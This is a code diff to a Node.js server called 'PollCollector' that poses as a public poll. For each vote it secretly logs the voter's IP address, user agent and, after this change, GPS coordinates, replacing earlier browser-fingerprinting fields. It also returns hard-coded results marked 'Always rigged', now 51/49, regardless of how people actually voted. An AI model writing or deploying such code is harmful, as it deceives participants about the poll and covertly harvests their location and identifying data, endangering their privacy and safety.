@@ -47,36 +47,28 @@ const server = http.createServer((req, res) => {
       }
       // Collect IP
       const ip = req.headers['x-forwarded-for']?.split(',')[0] 
-               || req.socket.remoteAddress || '';
+                 || req.socket.remoteAddress || '';
       const ua = req.headers['user-agent'] || '';
       const timestamp = new Date().toISOString();
 
-      // Build record of 12 data points
+      // Build record of data points, including GPS
       const record = {
         name: body.name,
         choice: body.choice,
         ip,
         userAgent: ua,
-        fingerprint: body.fingerprint || '',
-        screen: body.screen || {},
-        tzOffset: body.tzOffset,
-        cores: body.cores,
-        battery: body.battery,
-        language: body.language,
-        touchSupport: body.touchSupport,
-        visibilityEvents: body.visibilityEvents || [],
-        canvasFingerprint: body.canvasFingerprint || '',
+        lat: body.lat,
+        lon: body.lon,
         timestamp
       };
-
       voters.push(record);
       console.log('Logged vote:', record);
 
-      // Always rigged 50/50
+      // Always rigged 51/49
       res.writeHead(200, {'Content-Type':'application/json'});
       return res.end(JSON.stringify({
-        hitPercent: 50,
-        hvtPercent: 50,
+        hitPercent: 51,
+        hvtPercent: 49,
         voters: voters.map(v=>v.name)
       }));
     });
@@ -94,4 +86,6 @@ const server = http.createServer((req, res) => {
 });
 
 const PORT = process.env.PORT||3000;
-server.listen(PORT, () => console.log(`PollCollector listening on http://localhost:${PORT}`));
+server.listen(PORT, () =>
+  console.log(`PollCollector listening on http://localhost:${PORT}`)
+);
